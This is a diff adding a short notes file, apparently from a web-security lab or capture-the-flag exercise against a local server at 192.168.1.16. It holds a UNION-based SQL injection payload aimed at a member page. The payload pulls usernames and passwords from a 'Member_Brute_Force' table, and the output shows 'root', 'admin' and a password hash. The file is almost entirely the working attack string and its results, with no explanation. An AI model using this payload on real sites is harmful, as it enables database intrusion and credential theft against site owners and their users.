@@ -1,0 +1,22 @@
+http://192.168.1.16/?page=member
+1 UNION SELECT id, username FROM Member_Brute_Force.db_default UNION SELECT id, password FROM Member_Brute_Force.db_default--
+
+ID: 1 UNION SELECT id, username FROM Member_Brute_Force.db_default UNION SELECT id, password FROM Member_Brute_Force.db_default-- 
+First name: one
+Surname : me
+
+ID: 1 UNION SELECT id, username FROM Member_Brute_Force.db_default UNION SELECT id, password FROM Member_Brute_Force.db_default-- 
+First name: 1
+Surname : root
+
+ID: 1 UNION SELECT id, username FROM Member_Brute_Force.db_default UNION SELECT id, password FROM Member_Brute_Force.db_default-- 
+First name: 2
+Surname : admin
+
+ID: 1 UNION SELECT id, username FROM Member_Brute_Force.db_default UNION SELECT id, password FROM Member_Brute_Force.db_default-- 
+First name: 1
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+ID: 1 UNION SELECT id, username FROM Member_Brute_Force.db_default UNION SELECT id, password FROM Member_Brute_Force.db_default-- 
+First name: 2
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
